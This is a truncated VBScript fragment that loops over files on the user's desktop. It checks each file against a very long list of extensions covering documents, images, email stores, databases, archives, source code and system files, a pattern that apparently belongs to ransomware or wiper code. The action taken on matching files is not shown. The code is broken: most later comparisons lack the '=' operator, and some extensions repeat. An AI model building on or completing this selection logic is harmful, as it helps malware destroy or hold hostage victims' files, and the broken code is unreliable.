...
For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
    ...
    If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Or extension "aif" Or extension "cda" Or extension "mid" Or extension "mpa" Or extension "ogg" Or extension "wav" Or extension "wma" Or extension "wpl" Or extension "7z" Or extension "arj" Or extension "deb" Or extension "pkg" Or extension "rpm" Or extension "z" Or extension "bin" Or extension "dmg" Or extension "iso" Or extension "toast" Or extension "csv" Or extension "dat" Or extension "db" Or extension "log" Or extension "mdb" Or extension "sav" Or extension "sql" Or extension "tar" Or extension "email" Or extension "eml" Or extension "emlx" Or extension "msg" Or extension "oft" Or extension "ost" Or extension "pst" Or extension "vcf" Or extension "apk" Or extension "bat" Or extension "cgi" Or extension "com" Or extension "gadget" Or extension "jar" Or extension "msi" Or extension "wsf" Or extension "fnt" Or extension "fon" Or extension "otf" Or extension "ttf" Or extension "ai" Or extension "gif" Or extension "png" Or extension "ps" Or extension "psd" Or extension "svg" Or extension "tif" Or extension "asp" Or extension "cer" Or extension "cfm" Or extension "cgi" Or extension "jsp" Or extension "part" Or extension "rss" Or extension "xhtml" Or extension "key" Or extension "odp" Or extension "pps" Or extension "ppt" Or extension "pptx" Or extension "c" Or extension "class" Or extension "cpp" Or extension "cs" Or extension "h" Or extension "java" Or extension "sh" Or extension "swift" Or extension "ods" Or extension "xls" Or extension "xlsm" Or extension "xlsx" Or extension "cab" Or extension "cfg" Or extension "cpl" Or extension "cur" Or extension "dll" Or extension "dmp" Or extension "drv" Or extension "icns" Or extension "ini" Or extension "msi" Or extension "sys" Or extension "tmp" Or extension "3gs" Or extension "3gp" Or extension "avi" Or extension "flv" Or extension "h264" Or extension "m4v" Or extension "mkv" Or extension "mov" Or extension "mpg" Or extension "rm" Or extension "swf" Or extension "vob" Or extension "webm" Or extension "wmv" Then
